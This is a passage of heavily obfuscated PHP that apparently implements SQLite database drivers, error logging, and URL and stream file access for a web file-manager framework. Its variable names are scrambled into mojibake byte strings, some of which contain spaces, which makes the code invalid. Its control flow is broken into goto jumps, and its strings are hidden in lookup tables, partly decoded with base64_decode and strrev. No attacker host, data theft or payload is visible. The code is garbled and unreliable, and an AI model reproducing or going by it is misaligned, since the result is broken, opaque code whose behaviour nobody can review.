array($EÉàßÖ’¤Í[28] => $F÷‰µŸ˜´”[$EÉàßÖ’¤Í[27]], $EÉàßÖ’¤Í[29] => $F÷‰µŸ˜´”[$EÉàßÖ’¤Í[30]], $EÉàßÖ’¤Í[31] => (bool) ($F÷‰µŸ˜´”[$EÉàßÖ’¤Í[32]] === $EÉàßÖ’¤Í[33]), $EÉàßÖ’¤Í[34] => $F÷‰µŸ˜´”[$EÉàßÖ’¤Í[35]], $EÉàßÖ’¤Í[36] => strtolower($F÷‰µŸ˜´”[$EÉàßÖ’¤Í[37]]) == $EÉàßÖ’¤Í[38], $EÉàßÖ’¤Í[39] => strtolower($F÷‰µŸ˜´”[$EÉàßÖ’¤Í[40]]) == $EÉàßÖ’¤Í[41]); } } return $A­ğ‰ñ„ó; } public function getTables($Dœó‹—æ = '') { $C»É‚™…›° =& $_SERVER[¿õñ]; $fóš£ÛàŠ¬ = $this->query($C»É‚™…›°[42] . $C»É‚™…›°[43] . $C»É‚™…›°[44]); $B‹Œ½²šÈ = array(); foreach ($fóš£ÛàŠ¬ as $eî˜Ö¦´­Ó => $eç¦ˆĞí¸˜) { $B‹Œ½²šÈ[$eî˜Ö¦´­Ó] = current($eç¦ˆĞí¸˜); } return $B‹Œ½²šÈ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $b§ëŠ•¸¨£ =& $_SERVER[¿õñ]; $d±íÏÈÍÜ = sqlite_last_error($this->_linkID); $this->error = $d±íÏÈÍÜ . $b§ëŠ•¸¨£[4] . sqlite_error_string($d±íÏÈÍÜ); if ($b§ëŠ•¸¨£[33] != $this->queryStr) { $this->error .= LNG($b§ëŠ•¸¨£[45]) . $this->queryStr; } think_trace($this->error, $b§ëŠ•¸¨£[33], $b§ëŠ•¸¨£[46]); return $this->error; } public function escapeString($b‘ì£Äª†¢) { return sqlite_escape_string($b‘ì£Äª†¢); } public function parseLimit($F–Ó®ÅóÓ¢) { $c™ã¯¢«–® =& $_SERVER[¿õñ]; $BµƒÌÏ¿«• = $c™ã¯¢«–®[33]; if (!empty($F–Ó®ÅóÓ¢)) { $F–Ó®ÅóÓ¢ = explode($c™ã¯¢«–®[47], $F–Ó®ÅóÓ¢); if (count($F–Ó®ÅóÓ¢) > 1) { $BµƒÌÏ¿«• .= $c™ã¯¢«–®[48] . $F–Ó®ÅóÓ¢[1] . $c™ã¯¢«–®[49] . $F–Ó®ÅóÓ¢[0] . $c™ã¯¢«–®[50]; } else { $BµƒÌÏ¿«• .= $c™ã¯¢«–®[48] . $F–Ó®ÅóÓ¢[0] . $c™ã¯¢«–®[50]; } } return $BµƒÌÏ¿«•; } } class DbSqlite3Base extends Db { public function __construct($eôÁ«ŠªâŞ = '') { $cßßô‚•Ş® =& $_SERVER[¿õñ]; if (!class_exists($cßßô‚•Ş®[51])) { think_exception(think_lang($cßßô‚•Ş®[10]) . $cßßô‚•Ş®[52]); } if (!empty($eôÁ«ŠªâŞ)) { if (!isset($eôÁ«ŠªâŞ[$cßßô‚•Ş®[12]])) { $eôÁ«ŠªâŞ[$cßßô‚•Ş®[12]] = 438; } $this->config = $eôÁ«ŠªâŞ; if (empty($this->config[$cßßô‚•Ş®[13]])) { $this->config[$cßßô‚•Ş®[13]] = array(); } } } public function connect($EÄÀ×»ê‘ô = '', $Fï±ã“ÜâÖ = 0) { $cÒİ¡­Ù–ô =& $_SERVER[¿õñ]; if (!isset($this->linkID[$Fï±ã“ÜâÖ])) { if (empty($EÄÀ×»ê‘ô)) { $EÄÀ×»ê‘ô = $this->config; } $this->linkID[$Fï±ã“ÜâÖ] = new SQLite3($EÄÀ×»ê‘ô[$cÒİ¡­Ù–ô[17]]); if (!$this->linkID[$Fï±ã“ÜâÖ]) { think_exception($this->linkID[$Fï±ã“ÜâÖ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Fï±ã“ÜâÖ]->busyTimeout(30000); if (1 != think_config($cÒİ¡­Ù–ô[18])) { unset($this->config); } } return $this->linkID[$Fï±ã“ÜâÖ]; } public function free() { $this->queryID = null; } public function query($eĞİß Š†) { goto a²õ´ ‹Ğ¤; EåçøÍ³å: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eé™Æ®ÍÔˆ = $this->getAll(); $this->numRows = count($eé™Æ®ÍÔˆ); return $eé™Æ®ÍÔˆ; } goto Cî°ï¯ŞâÎ; a²õ´ ‹Ğ¤: $d™ëíÇ‘Æë =& $_SERVER[¿õñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cÃ¸¿’— Ú; d¶Ã¡ßßó: think_status($d™ëíÇ‘Æë[20]); $this->queryID = $this->_linkID->query($eĞİß Š†); $this->debug(); goto EåçøÍ³å; cÃ¸¿’— Ú: $this->queryStr = $eĞİß Š†; if ($this->queryID) { $this->free(); } think_action_status($d™ëíÇ‘Æë[19], 1); goto d¶Ã¡ßßó; Cî°ï¯ŞâÎ: } public function execute($D¥ÚÛ—) { goto cÈ… ÎœÅ•; aßÉÜ–Š´å: $this->queryStr = $D¥ÚÛ—; if ($this->queryID) { $this->free(); } think_action_status($FïÄÑÏÁÎé[21], 1); goto fâõä³†ã´; cÈ… ÎœÅ•: $FïÄÑÏÁÎé =& $_SERVER[¿õñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aßÉÜ–Š´å; eùÊ…¯ù•ç: if (!1 === $a—¿æ¹š) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eÇëïš®Ëƒ; fâõä³†ã´: think_status($FïÄÑÏÁÎé[20]); $a—¿æ¹š = $this->_linkID->exec($D¥ÚÛ—); $this->debug(); goto eùÊ…¯ù•ç; eÇëïš®Ëƒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¿õñ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÛìšá°—ê = $this->_linkID->query($_SERVER[¿õñ][23]); if (!$BÛìšá°—ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e±¾‡Ã×ß” = $this->_linkID->query($_SERVER[¿õñ][24]); if (!$e±¾‡Ã×ß”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $D…”æî÷ï¯ = array(); while ($aÍšÇ¼ÄŠ¥ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $D…”æî÷ï¯[] = $aÍšÇ¼ÄŠ¥; } $this->queryID->reset(); return $D…”æî÷ï¯; } public function getFields($D¤ğÃÂ²Ê) { $Aƒ–Æ—½² =& $_SERVER[¿õñ]; $eÛÎ‡¯ó« = $this->query($Aƒ–Æ—½²[25] . $D¤ğÃÂ²Ê . $Aƒ–Æ—½²[26]); $eĞÂøÚ¿† = array(); if ($eÛÎ‡¯ó«) { foreach ($eÛÎ‡¯ó« as $aÍŒ¯ßÛÇÇ => $c¦Ãò§‹Ù) { $eĞÂøÚ¿†[$c¦Ãò§‹Ù[$Aƒ–Æ—½²[28]]] = array($Aƒ–Æ—½²[28] => $c¦Ãò§‹Ù[$Aƒ–Æ—½²[28]], $Aƒ–Æ—½²[29] => $c¦Ãò§‹Ù[$Aƒ–Æ—½²[29]], $Aƒ–Æ—½²[31] => (bool) ($c¦Ãò§‹Ù[$Aƒ–Æ—½²[31]] === $Aƒ–Æ—½²[33]), $Aƒ–Æ—½²[34] => $c¦Ãò§‹Ù[$Aƒ–Æ—½²[53]], $Aƒ–Æ—½²[36] => (bool) $c¦Ãò§‹Ù[$Aƒ–Æ—½²[54]], $Aƒ–Æ—½²[39] => (bool) $c¦Ãò§‹Ù[$Aƒ–Æ—½²[54]]); } } return $eĞÂøÚ¿†; } public function getTables($eùÓğÃ”ä = '') { $dñ¡™è±ã =& $_SERVER[¿õñ]; $EÛì‚ø‰Ï = $this->query($dñ¡™è±ã[42] . $dñ¡™è±ã[43] . $dñ¡™è±ã[44]); $dÒîó…Ô£¶ = array(); foreach ($EÛì‚ø‰Ï as $e„ÃîØÈ® => $DÛíº‹˜˜æ) { $dÒîó…Ô£¶[$e„ÃîØÈ®] = current($DÛíº‹˜˜æ); } return $dÒîó…Ô£¶; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C©ÄÈ¤®š =& $_SERVER[¿õñ]; $this->error = $this->_linkID->lastErrorMsg(); if ($C©ÄÈ¤®š[33] != $this->queryStr) { $this->error .= LNG($C©ÄÈ¤®š[45]) . $this->queryStr; } think_trace($this->error, $C©ÄÈ¤®š[33], $C©ÄÈ¤®š[46]); return $this->error; } public function escapeString($DÒÒï©”Ï‡) { $càõ¢²¸›Ê =& $_SERVER[¿õñ]; if ($this->_linkID) { return $this->_linkID->escapeString($DÒÒï©”Ï‡); } return str_ireplace($càõ¢²¸›Ê[55], $càõ¢²¸›Ê[56], $DÒÒï©”Ï‡); } public function parseLimit($A…õÂÉæÊ) { $Eë‡ïÇ‚†Õ =& $_SERVER[¿õñ]; $AùÔÒª„‡Ì = $Eë‡ïÇ‚†Õ[33]; if (!empty($A…õÂÉæÊ)) { $A…õÂÉæÊ = explode($Eë‡ïÇ‚†Õ[47], $A…õÂÉæÊ); if (count($A…õÂÉæÊ) > 1) { $AùÔÒª„‡Ì .= $Eë‡ïÇ‚†Õ[48] . $A…õÂÉæÊ[1] . $Eë‡ïÇ‚†Õ[49] . $A…õÂÉæÊ[0] . $Eë‡ïÇ‚†Õ[50]; } else { $AùÔÒª„‡Ì .= $Eë‡ïÇ‚†Õ[48] . $A…õÂÉæÊ[0] . $Eë‡ïÇ‚†Õ[50]; } } return $AùÔÒª„‡Ì; } } goto eŸ²³ˆĞ×¡; aæ©‘‡¥Š…: function beforeShutdownError($eƒšŒ…ùŞ = false, $DÇÙÇ¬°†ô = '', $e”¯±É¼­‚ = '', $AöàÛ’Õ¬ = 0) { $dË÷§á‚Æ =& $_SERVER[ĞÌÅˆ•ÉíŒÆÆ]; switch ($eƒšŒ…ùŞ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $E÷£ã‰ÓÇÊ = $dË÷§á‚Æ[38]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $E÷£ã‰ÓÇÊ = $dË÷§á‚Æ[39]; break; case E_STRICT: $E÷£ã‰ÓÇÊ = $dË÷§á‚Æ[40]; break; case E_NOTICE: case E_USER_NOTICE: $E÷£ã‰ÓÇÊ = $dË÷§á‚Æ[41]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $E÷£ã‰ÓÇÊ = $dË÷§á‚Æ[42]; break; default: break; } if (!$E÷£ã‰ÓÇÊ || $E÷£ã‰ÓÇÊ == $dË÷§á‚Æ[41] || $E÷£ã‰ÓÇÊ == $dË÷§á‚Æ[42]) { return; } $e”¯±É¼­‚ = $dË÷§á‚Æ[4] . str_replace($_SERVER[$dË÷§á‚Æ[36]], $dË÷§á‚Æ[20], $e”¯±É¼­‚); $fÓ¨Ò¶Šç« = $E÷£ã‰ÓÇÊ . $dË÷§á‚Æ[43] . $DÇÙÇ¬°†ô . $dË÷§á‚Æ[43] . $e”¯±É¼­‚ . $dË÷§á‚Æ[43] . $AöàÛ’Õ¬; write_log($fÓ¨Ò¶Šç« . $dË÷§á‚Æ[18] . get_caller_msg(1), $dË÷§á‚Æ[19]); } $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][44]] = $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][36]] . $_SERVER[ĞÌÅˆ•ÉíŒÆÆ][45]; $F¡¼‘‚¬Ê° = strrev(base64_decode($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][46])); goto eš¯‡«½ÊÒ; cİ²Ç”åÅ®: $_SERVER[$_SERVER[ĞÌÅˆ•ÉíŒÆÆ][51]] = ("\x39\x31\x35\x30".base64_decode('Mzg='))+0;$_dI7F="9hcFIWzQXVCCDkG76PNuAtaNyBxCDFJ8hYxAVkQhrAsE44wRgEucpvzQTHeuw3HMP";; stream_wrapper_register($_SERVER[ĞÌÅˆ•ÉíŒÆÆ][52], $_SERVER[ĞÌÅˆ•ÉíŒÆÆ][53]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($CÄÃñÍí, $AÑ‰Üººó‡) { $b¾‘Ç®˜İ­ =& $_SERVER[¿õñ]; if (isset(self::$_methodList[$CÄÃñÍí])) { return @call_user_func_array(self::$_methodList[$CÄÃñÍí], $AÑ‰Üººó‡); } else { if (method_exists($this, $CÄÃñÍí)) { return call_user_func_array(array($this, $CÄÃñÍí), $AÑ‰Üººó‡); } else { think_exception(__CLASS__ . $b¾‘Ç®˜İ­[4] . $CÄÃñÍí . $b¾‘Ç®˜İ­[5]); } } } public static function __callStatic($Eæ¬ùÈƒ, $E³Ê¤»‰¿ã) { if (isset(self::$_methodListStatic[$Eæ¬ùÈƒ])) { return call_user_func_array(self::$_methodListStatic[$Eæ¬ùÈƒ], $E³Ê¤»‰¿ã); } else { if (method_exists(self, $Eæ¬ùÈƒ)) { return call_user_func_array(array(self, $Eæ¬ùÈƒ), $E³Ê¤»‰¿ã); } else { show_json("{$Eæ¬ùÈƒ}\x28\x29\x20\156\x6f\164\x20\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($F¥á†¸¹±È, $F¬¥Ğ†¡•¿) { self::$_methodList[$F¥á†¸¹±È] = $F¬¥Ğ†¡•¿; } public static function addMethodStatic($e±Ïğ¥…Óæ, $Bù±ïŞïíë) { self::$_methodListStatic[$e±Ïğ¥…Óæ] = $Bù±ïŞïíë; } } goto aæù· ‘îô; F’ç³…ìõ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($fñÖ¹‘İ‚, $Dã³²æçÕ¡ = 0) { parent::__construct(); $this->source = $fñÖ¹‘İ‚; $this->sourceSize = $Dã³²æçÕ¡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($eÇëŠ——¢™ = false) { return $this->sourceSize; } public function getContent($AÁñìÀ‚ÜŠ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $AšŸ¶ô¿à† = ftell($this->source); $aõßšÒŒãñ = @fread($this->source, $this->sourceSize); fseek($this->source, $AšŸ¶ô¿à†); return $aõßšÒŒãñ; } } public function fileSubstr($CŞ±ë††ÙÆ = false, $fÖÁá ½ñˆ = 0, $càŒö œã® = 0) { if (!$càŒö œã®) { $càŒö œã® = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $fÖÁá ½ñˆ, $càŒö œã®); } if ($this->sourceType == self::TYPE_FILE) { $F‘‰‰ÇåÂÜ = ftell($this->source); fseek($this->source, $F‘‰‰ÇåÂÜ + $fÖÁá ½ñˆ); $Dá˜ÊîŸ = @fread($this->source, $càŒö œã®); fseek($this->source, $F‘‰‰ÇåÂÜ); return $Dá˜ÊîŸ; } } public function hashMd5($DìÂ¯‡Âïâ = false) { return md5($this->getContent()); } public static function hash($CŠŠ†ßÏí¸, $AçìÃöÂ¼ = 0) { $céÑ‚±ğÃ = new PathDriverStream($CŠŠ†ßÏí¸, $AçìÃöÂ¼); return $céÑ‚±ğÃ->hashSimple($CŠŠ†ßÏí¸); } public static function md5($bÖ—¥…æ¿Û, $B·«¦„Ú¥ß = 0) { $E…õÖ½Áèß = new PathDriverStream($bÖ—¥…æ¿Û, $B·«¦„Ú¥ß); return $E…õÖ½Áèß->hashMd5($bÖ—¥…æ¿Û); } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($e‹ÅÅí¥îÑ = false) { } public function exist($bŒŒëÖÍ³š) { $CÌñìâ ¢ = $this->info($bŒŒëÖÍ³š); return $CÌñìâ ¢[$_SERVER[¿õñ][185]]; } public function isFile($Eƒ–Œ”æˆŒ) { $e¤¤´å÷×Ã = $this->info($Eƒ–Œ”æˆŒ); return $e¤¤´å÷×Ã[$_SERVER[¿õñ][185]]; } public function isFolder($b¹çÜ™·´¿) { return !1; } public function size($Eİññ¢–Î”) { $f—ñÏï¾¶‘ = $this->info($Eİññ¢–Î”); return $f—ñÏï¾¶‘[$_SERVER[¿õñ][78]]; } public function info($DŒ›Å«¢ñå) { return $this->infoParse($DŒ›Å«¢ñå); } public function infoAuth($EÂÍ­¦½Åœ) { return $this->infoParse($EÂÍ­¦½Åœ); } public function infoWithChildren($AöÙìÈ¸…­) { return $this->infoParse($AöÙìÈ¸…­); } public function infoFull($a‘â¨Ï‡ÄŸ) { return $this->infoParse($a‘â¨Ï‡ÄŸ); } private function infoParse($c¿÷©¸ŸôÃ) { $a…èÆ£°°œ =& $_SERVER[¿õñ]; $D®ùÔ²°˜ = $this->header($c¿÷©¸ŸôÃ); if (!$D®ùÔ²°˜ || !$D®ùÔ²°˜[$a…èÆ£°°œ[686]]) { return !1; } $c¾êíŠœ’¡ = _get($D®ùÔ²°˜, $a…èÆ£°°œ[322], 0); $BŸÁ“†õÙ = array($a…èÆ£°°œ[28] => $D®ùÔ²°˜[$a…èÆ£°°œ[28]], $a…èÆ£°°œ[76] => $c¿÷©¸ŸôÃ, $a…èÆ£°°œ[29] => $a…èÆ£°°œ[164], $a…èÆ£°°œ[78] => intval($c¾êíŠœ’¡), $a…èÆ£°°œ[157] => get_path_ext($D®ùÔ²°˜[$a…èÆ£°°œ[28]]), $a…èÆ£°°œ[1130] => $c¾êíŠœ’¡ > 0 && $D®ùÔ²°˜[$a…èÆ£°°œ[1210]], $a…èÆ£°°œ[1131] => !1); return $BŸÁ“†õÙ; } private function header($AëæîÜ„ÇÇ) { if (isset(self::$_cacheHeader[$AëæîÜ„ÇÇ])) { return self::$_cacheHeader[$AëæîÜ„ÇÇ]; } self::$_cacheHeader[$AëæîÜ„ÇÇ] = url_header($AëæîÜ„ÇÇ); return self::$_cacheHeader[$AëæîÜ„ÇÇ]; } public function hashSimple($d¬¼ã¥†©, $F‚”…¾æà = false) { goto C‹Øëè¸Õ›; dø•¨Œœ˜¡: $e¹¤ğøƒ‰ = timeFloat(); $aìèì„Öğ = 15; for ($DŠ˜„ŠùĞ = 0; $DŠ˜„ŠùĞ < $d¿œŸñåÑß; $DŠ˜„ŠùĞ++) { if (timeFloat() - $e¹¤ğøƒ‰ > $aìèì„Öğ) { return !1; } $béôÑº±Ã˜ = $this->fileSubstr($d¬¼ã¥†©, $Açñ´Ç¶œë * $DŠ˜„ŠùĞ, $aİƒƒ­Äç¸); if (!$béôÑº±Ã˜) { return !1; } $eç¸àô¿¸Ä .= $béôÑº±Ã˜; } goto cŠ§„«â¾Š; câ”çÁÅ­: if ($e·–õ‚ÂŒ‰ <= $aİƒƒ­Äç¸ * $d¿œŸñåÑß) { return md5($this->fileSubstr($d¬¼ã¥†©, 0, $e·–õ‚ÂŒ‰)) . $e·–õ‚ÂŒ‰; } $Açñ´Ç¶œë = intval($e·–õ‚ÂŒ‰ / $d¿œŸñåÑß); $eç¸àô¿¸Ä = $d÷ğ²±ô¼[33]; goto dø•¨Œœ˜¡; d½†ªï‡È‰: $e·–õ‚ÂŒ‰ = $AÒÆÎ¹ÌØŠ[$d÷ğ²±ô¼[78]]; $aİƒƒ­Äç¸ = 200; $d¿œŸñåÑß = 50; goto câ”çÁÅ­; C‹Øëè¸Õ›: $d÷ğ²±ô¼ =& $_SERVER[¿õñ]; $AÒÆÎ¹ÌØŠ = $this->info($d¬¼ã¥†©); if (!$AÒÆÎ¹ÌØŠ || !$AÒÆÎ¹ÌØŠ[$d÷ğ²±ô¼[185]]) { return !1; } goto d½†ªï‡È‰; cŠ§„«â¾Š: $eç¸àô¿¸Ä .= $this->fileSubstr($d¬¼ã¥†©, $e·–õ‚ÂŒ‰ - $aİƒƒ­Äç¸, $aİƒƒ­Äç¸); return md5($eç¸àô¿¸Ä) . $e·–õ‚ÂŒ‰; goto FĞÄÅ†œ‘‹; FĞÄÅ†œ‘‹: } public function getContent($dİùäˆ¹¤) { return $this->fileSubstr($dİùäˆ¹¤); } public function fileSubstr($F¿“¸å¦ŠŒ, $dí³Ñº = 0, $bØÑÕ” »© = -1) { goto f²°¹„œÒ; EòÂ¬âÆË: if ($bØÑÕ” »© === -1) { $bØÑÕ” »© = $eÊÚİ¦½·[$eŸÌÏƒ °[78]]; } if ($bØÑÕ” »© == 0) { return $eŸÌÏƒ °[33]; } $bä‚˜ì¿ÛÕ = array($eŸÌÏƒ °[1211] . $dí³Ñº . $eŸÌÏƒ °[710] . ($dí³Ñº + $bØÑÕ” »© - 1)); goto aŞğ¬¥¤‘; aŞğ¬¥¤‘: $A…¿Ÿ„ºœµ = url_request($F¿“¸å¦ŠŒ, $eŸÌÏƒ °[213], !1, $bä‚˜ì¿ÛÕ, !1, !1, 1); return $A…¿Ÿ„ºœµ[$eŸÌÏƒ °[1019]] ? $A…¿Ÿ„ºœµ[$eŸÌÏƒ °[1019]] : $eŸÌÏƒ °[33]; goto AˆÉ‘§š³Ò; f²°¹„œÒ: $eŸÌÏƒ ° =& $_SERVER[¿õñ]; $eÊÚİ¦½· = $this->info($F¿“¸å¦ŠŒ); if (!$eÊÚİ¦½· || !$eÊÚİ¦½·[$eŸÌÏƒ °[185]] && $eÊÚİ¦½·[$eŸÌÏƒ °[78]] > 1024 * 1024 * 10) { return !1; } goto EòÂ¬âÆË; AˆÉ‘§š³Ò: } public function download($e²ºÄŠÆ³ğ, $A½ÛÜ÷±ºà) { Downloader::start($e²ºÄŠÆ³ğ, $A½ÛÜ÷±ºà); return $A½ÛÜ÷±ºà; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($DçÕ‡Ãºê, $E¬ï¼Ò®Ã = '') { goto d‹ÜÊë‡ƒ—; d‹ÜÊë‡ƒ—: $this->info = $this->info($DçÕ‡Ãºê); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¿õñ][76]]; goto f—ÂŞ¼µ ì; f—ÂŞ¼µ ì: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$DçÕ‡Ãºê])) { self::$_chunkBuffer[$DçÕ‡Ãºê] = array(); } goto a¡¥ø‘‘ˆ‚; a¡¥ø‘‘ˆ‚: return $this->info ? !0 : !1; goto AïÁÎ¡ÅšÃ; AïÁÎ¡ÅšÃ: } function stream_read($eí‚Ò­ÂÔ) { $Aí¼ÅÀµ = $this->fileSubstr($this->pose, $eí‚Ò­ÂÔ); $this->pose += strlen($Aí¼ÅÀµ); return $Aí¼ÅÀµ; } public function stream_tell() { return $this->pose; } public function stream_seek($a×ğÃİì©¸, $aæ¶ù“©ô) { $dá†œáŠí =& $_SERVER[¿õñ]; if ($aæ¶ù“©ô == SEEK_SET) { $this->pose = $a×ğÃİì©¸; } else { if ($aæ¶ù“©ô == SEEK_CUR) { $this->pose += $a×ğÃİì©¸; } else { if ($aæ¶ù“©ô == SEEK_END) { $this->pose = $this->info[$dá†œáŠí[78]] + intval($a×ğÃİì©¸); } } } if ($a×ğÃİì©¸ < 0) { $this->pose = $this->info[$dá†œáŠí[78]] + $a×ğÃİì©¸; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¿õñ][78]]; } public function stream_close() { return !0; } public function url_stat($b¥È‹ğ¯®, $AˆŠ³À‰í) { $fÓÌá =& $_SERVER[¿õñ]; $FœË ‡‘İó = $this->info($b¥È‹ğ¯®); return array($fÓÌá[1212] => 0, $fÓÌá[1213] => 0, $fÓÌá[12] => 32768 + 511, $fÓÌá[1214] => 0, $fÓÌá[1215] => 0, $fÓÌá[1216] => 0, $fÓÌá[1217] => 0, $fÓÌá[78] => $FœË ‡‘İó[$fÓÌá[78]], $fÓÌá[1218] => $FœË ‡‘İó[$fÓÌá[1136]], $fÓÌá[1219] => $FœË ‡‘İó[$fÓÌá[106]], $fÓÌá[1220] => $FœË ‡‘İó[$fÓÌá[184]], $fÓÌá[1221] => 0, $fÓÌá[1222] => 0); } static $fileInfo = array(); public function info($f±Äš¤ÇÚ¬) { $aœÌ¼æ«¨ø = $_SERVER[¿õñ][1223]; if (isset(self::$fileInfo[$f±Äš¤ÇÚ¬])) { return self::$fileInfo[$f±Äš¤ÇÚ¬]; } if (substr($f±Äš¤ÇÚ¬, 0, strlen($aœÌ¼æ«¨ø)) != $aœÌ¼æ«¨ø) { return !1; } self::$fileInfo[$f±Äš¤ÇÚ¬] = IO::info(substr($f±Äš¤ÇÚ¬, strlen($aœÌ¼æ«¨ø))); return self::$fileInfo[$f±Äš¤ÇÚ¬]; } public static function read($c‘Ìù†, $dŸÙ¤ØâÍ°, $E÷ÀˆÕ‚—¸) { goto fâ–àáª¹Š; aòÏ²ù“ƒï: return $dìÁ®Ò‹; goto Aä¸©‡œˆ²; fâ–àáª¹Š: $bˆ´Äö„¸Ğ =& $_SERVER[¿õñ]; $fùÁ×°ªİ£ = fopen($c‘Ìù†, $bˆ´Äö„¸Ğ[1138]); if (!$fùÁ×°ªİ£) { return $bˆ´Äö„¸Ğ[33]; } goto C¸Ì¿¢õÕ–; C¸Ì¿¢õÕ–: $CŠâ¥¥ƒËì = 8192; fseek($fùÁ×°ªİ£, $dŸÙ¤ØâÍ°, SEEK_SET); $dìÁ®Ò‹ = $bˆ´Äö„¸Ğ[33]; goto b‚÷ˆ›ƒ ë; b‚÷ˆ›ƒ ë: $fÇˆ­å‹Ä = 0; while ($fÇˆ­å‹Ä < $E÷ÀˆÕ‚—¸) { $a•‡ŒÌå¦± = min($CŠâ¥¥ƒËì, $E÷ÀˆÕ‚—¸ - $fÇˆ­å‹Ä); $dìÁ®Ò‹ .= fread($fùÁ×°ªİ£, $a•‡ŒÌå¦±); $fÇˆ­å‹Ä += $a•‡ŒÌå¦±; } fclose($fùÁ×°ªİ£); goto aòÏ²ù“ƒï; Aä¸©‡œˆ²: } public function fileSubstr($A·æ¿Ç×Å¿, $F¹°‹ÄÂ…“) { goto d„çÂ–ºÚÆ; AÚ«á“ÛŠğ: $DÒâ¿ËªÛ = 0; $Aç÷é±¿Ö = 0; $fŠ–¥îõ¹˜ = $D‘Ô£Í­‰õ[33]; goto bã«Ó°ƒ†÷; Aµ¥É‡‘Õé: $FŒŒŞ“ô« = $F¹°‹ÄÂ…“; if ($A·æ¿Ç×Å¿ < 0) { $A·æ¿Ç×Å¿ = $dè×¹×âù· + $A·æ¿Ç×Å¿; } if ($F¹°‹ÄÂ…“ === !1) { $F¹°‹ÄÂ…“ = $dè×¹×âù· - $A·æ¿Ç×Å¿; } goto F±‹¶Ì‘š; BÀ‘©£»“: $dñ°Êª¡¦¶ = 64 * 1024; $D‹·òïÖ„¨ =& self::$_chunkBuffer[$this->path]; if (!$D‹·òïÖ„¨) { $D‹·òïÖ„¨ = array(); } goto AÚ«á“ÛŠğ; bã«Ó°ƒ†÷: foreach ($D‹·òïÖ„¨ as $DÒâ¿ËªÛ => $fŠ–¥îõ¹˜) { $DÒâ¿ËªÛ = intval($DÒâ¿ËªÛ); $Aç÷é±¿Ö = $DÒâ¿ËªÛ + strlen($fŠ–¥îõ¹˜); if ($A·æ¿Ç×Å¿ >= $Aç÷é±¿Ö) { continue; } if ($A·æ¿Ç×Å¿ >= $DÒâ¿ËªÛ && $A·æ¿Ç×Å¿ + $F¹°‹ÄÂ…“ <= $Aç÷é±¿Ö) { return substr($fŠ–¥îõ¹˜, $A·æ¿Ç×Å¿ - $DÒâ¿ËªÛ, $F¹°‹ÄÂ…“); } break; } if (count($D‹·òïÖ„¨) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($D‘Ô£Í­‰õ[1224], $D‘Ô£Í­‰õ[1225] . count($D‹·òïÖ„¨) . "\73\163\164\x61\x72\x74\75{$A·æ¿Ç×Å¿}\54\x6c\x65\156\x67\x74\150\75{$F¹°‹ÄÂ…“}\73\x70\x6f\163\145\x3a{$DÒâ¿ËªÛ}\176{$Aç÷é±¿Ö}"); throw new Exception($D‘Ô£Í­‰õ[1226]); } $FÊÜ”ì…… = intval($A·æ¿Ç×Å¿ / $dñ°Êª¡¦¶) * $dñ°Êª¡¦¶; goto b®Î¢ßŠÁ½; d„çÂ–ºÚÆ: $D‘Ô£Í­‰õ =& $_SERVER[¿õñ]; $dè×¹×âù· = $this->info[$D‘Ô£Í­‰õ[78]]; $cà®ÖÖíˆ¾ = $A·æ¿Ç×Å¿; goto Aµ¥É‡‘Õé; cùÊŠ§­ƒî: ksort($D‹·òïÖ„¨); $A†æòÙ« = substr($DÍ‘ÖÆÊ•, $A·æ¿Ç×Å¿ - $FÊÜ”ì……, $F¹°‹ÄÂ…“); return $A†æòÙ«; goto EãÈàíŠ±İ; b®Î¢ßŠÁ½: $cÑ°»ïÆïÍ = ceil(($A·æ¿Ç×Å¿ + $F¹°‹ÄÂ…“) / $dñ°Êª¡¦¶) * $dñ°Êª¡¦¶ - $FÊÜ”ì……; $DÍ‘ÖÆÊ• = IO::fileSubstr($this->path, $FÊÜ”ì……, $cÑ°»ïÆïÍ); $D‹·òïÖ„¨[$FÊÜ”ì…… . $D‘Ô£Í­‰õ[33]] = $DÍ‘ÖÆÊ•; goto cùÊŠ§­ƒî; F±‹¶Ì‘š: if ($A·æ¿Ç×Å¿ + $F¹°‹ÄÂ…“ > $dè×¹×âù·) { $F¹°‹ÄÂ…“ = 